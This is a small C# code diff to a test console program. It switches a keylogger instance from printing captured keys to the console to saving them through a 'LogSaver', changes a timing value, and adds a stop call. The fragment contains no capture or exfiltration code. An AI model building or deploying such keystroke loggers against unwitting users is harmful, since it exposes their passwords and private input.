@@ -7,9 +7,10 @@ namespace TestConsole
     {
         static void Main(string[] args)
         {
-            KeyLoggerInstance keyLogger = new KeyLoggerInstance(new KeyCheker(), new ConsoleLogPrinter(), 10, 900);
+            KeyLoggerInstance keyLogger = new KeyLoggerInstance(new KeyCheker(), new LogSaver(), 10, 10000);
             keyLogger.Start();
             Console.ReadLine();
+            keyLogger.Stop();
         }
         
     }
